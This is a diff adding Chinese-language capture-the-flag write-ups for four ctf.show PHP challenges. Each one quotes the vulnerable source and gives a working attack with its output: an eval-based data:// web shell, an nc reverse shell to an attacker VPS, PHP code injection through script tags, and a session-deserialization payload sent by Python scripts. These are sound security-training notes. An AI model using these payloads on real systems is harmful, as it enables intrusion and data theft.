@@ -4888,6 +4888,380 @@ ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str
 
 ------
 
+### easy_calc
+
+`PHP`代码审计，靶机的源码如下：
+
+```php
+<?php
+if(check($code)){
+    eval('$result='."$code".";");
+    echo($result);    
+}
+
+function check(&$code){
+    $num1=$_POST['num1'];
+    $symbol=$_POST['symbol'];
+    $num2=$_POST['num2'];
+    if(!isset($num1) || !isset($num2) || !isset($symbol) ){
+        return false;
+    }
+    if(preg_match("/!|@|#|\\$|\%|\^|\&|\(|_|=|{|'|<|>|\?|\?|\||`|~|\[/", $num1.$num2.$symbol)){
+        return false;
+    }
+    if(preg_match("/^[\+\-\*\/]$/", $symbol)){
+        $code = "$num1$symbol$num2";
+        return true;
+    }
+    return false;
+}
+```
+
+通过`POST`请求传参三个值`num1`、`symbol`、`num2`，将其拼接在一起后用`eval()`函数执行。
+
+在PHP中常见的能拼接在一起执行的语言结构有：`echo`，`include`，`require`。
+
+如果使用`include`，那肯定要用到`PHP`伪协议。由于存在过滤，所以不能执行常规的明文语句。
+
+```
+include "data://text/plain,<?php eval($_POST['shell']);?>"
+```
+
+需要用到`base64`编码来绕过。
+
+```python
+>>> from base64 import *
+>>> b64encode(b"<?php eval($_POST['shell']);?>")
+b'PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+'
+```
+
+这样应该就能正常执行了。
+
+```
+include "data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+";
+```
+
+编写`Python`代码求解：
+
+```python
+import re
+import requests
+
+url = "http://47fd597b-18ab-4b77-a43c-b202431a2735.challenge.ctf.show/"
+data={
+    "num1":'include "data://text',
+    "symbol":"/",
+    "num2":'plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+";',
+    "shell":'system("ls /");'
+}
+# r = requests.post(url=url,data=data)
+# print(r.text)
+# bin dev etc home lib media mnt opt proc root run sbin secret srv sys tmp usr var
+data["shell"] = 'system("cat /secret");'
+r = requests.post(url=url,data=data)
+# print(r.text)
+flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
+if flag_match:
+    flag = flag_match.group(0)
+    print(f"Flag found!\n{flag}")
+# ctfshow{57a4b546-1616-4aec-be7f-2e0c374e49c4}
+```
+
+提交`ctfshow{57a4b546-1616-4aec-be7f-2e0c374e49c4}`即可。
+
+------
+
+### easy_cmd
+
+> 大牛：我渗透进某个路由设备，但是只能用4个命令，你能帮我getshell吗？
+
+靶机的源码如下：
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+$cmd=$_POST['cmd'];
+
+if(preg_match("/^\b(ping|ls|nc|ifconfig)\b/",$cmd)){
+        exec(escapeshellcmd($cmd));
+}
+?>
+```
+
+只允许执行 `ping`、`ls`、`nc`、`ifconfig` 这四种命令。`escapeshellcmd()`函数会对命令进行转义，这会禁用大多数 shell 特殊字符（如 `;` `&` `|` `$` 等），防止命令拼接。但是`escapeshellcmd()`不会阻止参数传递，因此只要命令本身合法就可以添加参数。
+
+用`nc`构造反弹shell，先登录自己的云服务器`VPS-IP`，监听特定端口（如`9999`）。
+
+```bash
+nc -lvnp 9999
+```
+
+用`HackBar`构造`POST`请求，向靶机发送数据如下：
+
+```
+cmd=nc VPS-IP 9999 -e /bin/sh
+```
+
+此时在靶机可以看到`Connection received`，这意味着反弹shell构造成功，执行命令即可操控靶机。
+
+```bash
+$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 124.223.158.81 46233
+ls /
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+secret
+srv
+sys
+tmp
+usr
+var
+cat /secret
+ctfshow{a96912af-ef8e-4c9f-92a5-1d2105162ce3}
+```
+
+提交`ctfshow{a96912af-ef8e-4c9f-92a5-1d2105162ce3}`即可。
+
+------
+
+### easy_eval
+
+靶机的源码如下：
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+$code = $_POST['code'];
+
+if(isset($code)){
+  $code = str_replace("?","",$code);
+  eval("?>".$code);
+}
+```
+
+问号会被替换，并且在`eval()`函数执行`POST`传递的`code`参数前，会拼接`?>`将`<?php`标签进行闭合。
+
+我们可以使用`<script language="php"></script>`来执行`PHP`代码。
+
+用`ls /`查看靶机的根目录。
+
+```
+code=<script language="php">system('ls /');</script>
+```
+
+> bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr var
+
+用`cat /f1agaaa`来获取`flag`。
+
+```
+code=<script language="php">system('cat /f1agaaa');</script>
+```
+
+> ctfshow{87c6fb48-4d6b-4299-8257-f7d9a05b0c69}
+
+提交`ctfshow{87c6fb48-4d6b-4299-8257-f7d9a05b0c69}`即可。
+
+------
+
+### 剪刀石头布
+
+> hint：我为啥要ini_set来着 
+> hint2：php.ini配置的稀烂
+
+进入靶机后点击`show source`查看源码：
+
+```php+HTML
+<?php
+    ini_set('session.serialize_handler', 'php');
+    if(isset($_POST['source'])){
+        highlight_file(__FILE__);
+    phpinfo();
+    die();
+    }
+    error_reporting(0);
+    include "flag.php";
+    class Game{
+        public $log,$name,$play;
+
+        public function __construct($name){
+            $this->name = $name;
+            $this->log = '/tmp/'.md5($name).'.log';
+        }
+
+        public function play($user_input,$bot_input){
+            $output = array('Rock'=>'&#9996;&#127995;','Paper'=>'&#9994;&#127995;','Scissors'=>'&#9995;&#127995;');
+            $this->play = $user_input.$bot_input;
+            if($this->play == "RockRock" || $this->play == "PaperPaper" || $this->play == "ScissorsScissors"){
+                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." Draw</div>\n",FILE_APPEND);
+                return "Draw";
+            } else if($this->play == "RockPaper" || $this->play == "PaperScissors" || $this->play == "ScissorsRock"){
+                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." You Lose</div>\n",FILE_APPEND);
+                return "You Lose";
+            } else if($this->play == "RockScissors" || $this->play == "PaperRock" || $this->play == "ScissorsPaper"){
+                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." You Win</div>\n",FILE_APPEND);
+                return "You Win";
+            }
+        }
+
+        public function __destruct(){
+                echo "<h5>Game History</h5>\n";
+        echo "<div class='all_output'>\n";
+                echo file_get_contents($this->log);
+        echo "</div>";
+        }
+    }
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="icon.png">
+    <title>Rock Paper Scissors</title>
+    <!-- post 'source' to view something --> 
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<?php
+    session_start();
+    if(isset($_POST['name'])){
+        $_SESSION['name']=$_POST['name'];
+        $_SESSION['win']=0;
+    }
+    if(!isset($_SESSION['name'])){
+        ?>
+        <body>
+            <h5>Input your name :</h5>
+            <form method="post">
+            <input type="text" class="result" name="name"></input>
+            <button type="submit">submit</button>
+            </form>
+        </body>
+        </html>
+<?php exit();
+    }
+?>
+
+<body>
+<?php
+echo "<h5>Welecome ".$_SESSION['name'].", now you win ".$_SESSION['win']." rounds.</h5>";
+$Game=new Game($_SESSION['name']);
+?>
+    <h5>Make your choice :</h5>
+    <form method="post">
+    <button type="submit" value="Rock" name="choice">&#9996;&#127995;</button>
+    <button type="submit" value="Paper" name="choice">&#9994;&#127995;</button>
+    <button type="submit" value="Scissors" name="choice">&#9995;&#127995;</button>
+    </form>
+
+    <?php
+    $choices = array("Rock", "Paper", "Scissors");
+    $rand_bot = array_rand($choices);
+    $bot_input = $choices[$rand_bot];
+    if(isset($_POST["choice"]) AND in_array($_POST["choice"],$choices)){
+        $user_input = $_POST["choice"];
+        $result=$Game->play($user_input,$bot_input);
+        if ($result=="You Win"){
+            $_SESSION['win']+=1;
+        } else {
+            $_SESSION['win']=0;
+        }
+    } else {
+        ?>
+        <form method="post">
+        <button class="flag" value="flag" name="flag">get flag</button>
+        <button class="source" value="source" name="source">show source</button>
+        </form>
+        <?php
+        if(isset($_POST["flag"])){
+            if($_SESSION['win']<100){
+                echo "<div>You need to win 100 rounds in a row to get flag.</div>";
+            } else {
+                echo "Here is your flag:".$flag;
+            }
+        }
+    }
+    ?>
+</body>
+</html>
+```
+
+`file_get_contents($this->log)`：只要能够控制`$this->log`将其值改为`flag.php`就能得到`flag`。或者`$_SESSION['win']>=100`，赢100局拿到`flag`。
+
+除了源码外，我们还可以在`phpinfo();`中看到服务器默认的`session`的处理器为`php_serialize`。
+
+| session.serialize_handler | php  | php_serialize |
+| ------------------------- | ---- | ------------- |
+
+第一行`PHP`代码就是`ini_set('session.serialize_handler', 'php');`，这正是`hint`。也就是说代码将`php_serialize`改成了`php`作为`session`的处理器。我们可以利用它俩的差异来实现漏洞利用：
+
+- `php_serialize`：经过`serialize`函数序列化数组
+- `php`：键名+竖线+`serialize`函数处理的值
+- `php_binary`：键名对应的长度的ASCII字符+键名+`serialize`序列化的值
+
+构造`Payload`：
+
+```php
+<?php
+class Game{
+    public $log='/var/www/html/flag.php';
+}
+
+$p=new Game();
+echo serialize($p);
+// |O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}
+```
+
+在Cookie中可以获取`PHPSESSID=1c39019d5f1500fbaa3e40b0c3ff0456`。
+
+编写`Python`代码利用`session`反序列化漏洞。
+
+```python
+import re
+import requests
+
+url = 'http://897e2bc3-63dd-4efe-801a-17329f24f9b8.challenge.ctf.show/'
+session = '1c39019d5f1500fbaa3e40b0c3ff0456'
+payload = '|O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}'
+data = {'PHP_SESSION_UPLOAD_PROGRESS':f'{payload}'}
+r = requests.post(url=url, data=data, cookies={'PHPSESSID':f'{session}'})
+# print(r.text)
+flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
+if flag_match:
+    flag = flag_match.group(0)
+    print(f"Flag found!\n{flag}")
+# ctfshow{c2c05129-7600-4aa1-8e57-ca3368afee72}
+```
+
+或者使用这个`payload`，赢100次。
+
+```python
+payload = '2|s:1:"2";name|s:1:"1";win|i:100;'
+```
+
+> Here is your flag:ctfshow{c2c05129-7600-4aa1-8e57-ca3368afee72}
+
+提交`ctfshow{c2c05129-7600-4aa1-8e57-ca3368afee72}`即可。
+
+------
+
 ### 萌新杯web1
 
 > 代码很安全，没有漏洞。
